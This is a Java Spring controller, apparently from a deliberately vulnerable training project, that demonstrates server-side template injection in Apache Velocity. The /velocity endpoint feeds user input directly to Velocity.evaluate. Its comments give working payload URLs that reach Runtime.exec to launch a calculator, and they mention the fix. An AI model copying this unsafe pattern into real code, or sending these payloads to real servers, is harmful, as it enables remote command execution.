package com.seczone.security.controller;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import java.io.StringWriter;


@Controller
@RequestMapping("/")
public class SSTIController {

    @GetMapping("/tovelocity")
    private String  tovelocity(){
        return "SSTIindex";
    }

    /**
     * SSTI of Java velocity. The latest Velocity version still has this problem.
     * Fix method: Avoid to use Velocity.evaluate method.
     *  http://localhost:9092/velocity?template=%23set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("open%20-a%20Calculator")
     *  http://localhost:9092/velocity?template=set%28%24e%3D%22e%22%29%3B%24e.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getMethod%28%22getRuntime%22%2Cnull%29.invoke%28null%2Cnull%29.exec%28%22open+-a+Calculator%22%29     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)
     * Open a calculator in MacOS.
     *
     */
    @GetMapping("/velocity")
    private static void velocity(String template){
        Velocity.init();
        // 正确输出#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("open -a Calculator")

        System.out.println("template:"+template);
        VelocityContext context = new VelocityContext();

        context.put("author", "Elliot A.");
        context.put("address", "217 E Broadway");
        context.put("phone", "555-1337");

        StringWriter swOut = new StringWriter();
        Velocity.evaluate(context, swOut, "test", template);
    }
}
